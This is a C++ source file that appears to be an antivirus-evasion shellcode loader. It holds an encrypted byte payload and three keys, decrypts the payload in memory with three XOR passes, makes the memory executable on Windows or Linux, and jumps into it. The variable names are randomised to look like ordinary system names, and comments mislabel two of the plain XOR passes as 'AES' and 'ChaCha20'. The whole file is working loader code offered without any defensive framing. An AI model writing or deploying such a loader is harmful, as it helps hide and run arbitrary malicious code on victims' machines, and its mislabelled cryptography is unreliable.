#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#endif

int main() {
    // Payload data
    unsigned char sysBasekrdGSz329[] = {
        0x98, 0xc1, 0xa8, 0xc7, 0xfe, 0x3e, 0x6e, 0x8f, 0xf8, 0x6c, 0x8f, 0x97, 0x3d, 0x72, 0x8e, 0xf3, 
        0x2f, 0x57, 0x46, 0xef, 0xb6, 0x0f, 0x4c, 0xcf, 0xc9, 0xbe, 0xca, 0xa6, 0xfd, 0x37, 0xbf, 0x3a, 
        0x98, 0xc1, 0x80, 0xc7, 0x75
    };

    // Decryption keys
    unsigned char procHelperJRLnXZNtC853[] = {
        0x92, 0x48, 0x94, 0x76, 0x42, 0xff, 0x9c, 0x51
    };
    unsigned char execServicezgwlBWYwXqf089[] = {
        0xe1, 0x8c, 0x40, 0x75, 0x92, 0xae, 0x06, 0x5e
    };
    unsigned char runModuleTwYkIQKqa438[] = {
        0x8c, 0x80, 0xa7, 0x68, 0xa3, 0x20, 0x1f, 0x5c, 0xa8, 0xfb, 0xae, 0xa0, 0x65, 0xbc, 0xc3, 0x98
    };

    // Allocate executable memory
    size_t execManagerqGlkgIZMdnX172 = sizeof(sysBasekrdGSz329);
#ifdef _WIN32
    void* instServiceeAeIRtGrtVz404 = VirtualAlloc(0, execManagerqGlkgIZMdnX172, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!instServiceeAeIRtGrtVz404) return 1;
#else
    void* instServiceeAeIRtGrtVz404 = mmap(0, execManagerqGlkgIZMdnX172, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (instServiceeAeIRtGrtVz404 == MAP_FAILED) return 1;
#endif

    // Copy payload to allocated memory
    memcpy(instServiceeAeIRtGrtVz404, sysBasekrdGSz329, execManagerqGlkgIZMdnX172);
    unsigned char* valHandlerWrvSCSwDuj376 = (unsigned char*)instServiceeAeIRtGrtVz404;

    // In-memory decryption
    // Decrypt XOR layer
    for (size_t i = 0; i < execManagerqGlkgIZMdnX172; i++) {
        valHandlerWrvSCSwDuj376[i] ^= procHelperJRLnXZNtC853[i % sizeof(procHelperJRLnXZNtC853)];
    }

    // Decrypt AES layer
    for (size_t i = 0; i < execManagerqGlkgIZMdnX172; i++) {
        valHandlerWrvSCSwDuj376[i] ^= runModuleTwYkIQKqa438[i % sizeof(runModuleTwYkIQKqa438)];
    }

    // Decrypt ChaCha20 layer
    for (size_t i = 0; i < execManagerqGlkgIZMdnX172; i++) {
        valHandlerWrvSCSwDuj376[i] ^= execServicezgwlBWYwXqf089[i % sizeof(execServicezgwlBWYwXqf089)];
    }

    // Make memory executable
#ifdef _WIN32
    DWORD methComponentGmVkIPscIUGJm074;
    VirtualProtect(instServiceeAeIRtGrtVz404, execManagerqGlkgIZMdnX172, PAGE_EXECUTE_READ, &methComponentGmVkIPscIUGJm074);
    FlushInstructionCache(GetCurrentProcess(), instServiceeAeIRtGrtVz404, execManagerqGlkgIZMdnX172);
#else
    mprotect(instServiceeAeIRtGrtVz404, execManagerqGlkgIZMdnX172, PROT_READ | PROT_EXEC);
#endif

    // Execute payload
    ((void(*)())instServiceeAeIRtGrtVz404)();

    return 0;
}
